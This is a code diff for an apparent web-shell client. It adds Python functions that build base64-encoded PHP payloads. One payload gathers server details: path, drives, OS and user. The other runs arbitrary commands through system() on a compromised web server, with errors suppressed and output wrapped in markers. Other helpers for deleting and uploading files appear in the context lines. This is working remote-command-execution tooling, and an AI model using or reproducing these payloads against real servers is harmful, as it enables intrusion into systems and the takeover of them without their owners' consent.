@@ -177,6 +177,47 @@ def createDir(path):
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
 
+def execShellCreate():
+    code="""
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    echo("<ek>");;
+    $D=dirname($_SERVER["SCRIPT_FILENAME"]);
+    if($D=="")
+	    $D=dirname($_SERVER["PATH_TRANSLATED"]);
+    $R="{$D}\t";
+    if(substr($D,0,1)!="/"){
+	    foreach(range("A","Z") as $L)
+	    	if(is_dir("{$L}:"))$R.="{$L}:";
+    }
+    $R.="\t";
+    $u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';
+    $usr=($u)?$u['name']:@get_current_user();
+    $R.=php_uname();
+    $R.="({$usr})";
+    print $R;;
+    echo("</ek>");
+    die();"""
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
+def execShell(cmd, options):
+    code = """
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    echo("->|");;
+    $p=base64_decode('%s');
+    $s=base64_decode('%s');
+    $d=dirname($_SERVER["SCRIPT_FILENAME"]);
+    $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";
+    @system($r." 2>&1",$ret);
+    print ($ret!=0)?"ret={$ret}":"";;
+    echo("|<-");die();
+    """% (cmd, options)
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
+
 if __name__ == '__main__':
     # print(deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
     print(uploadFile('/vae/asd/asd', 'asdasd'))
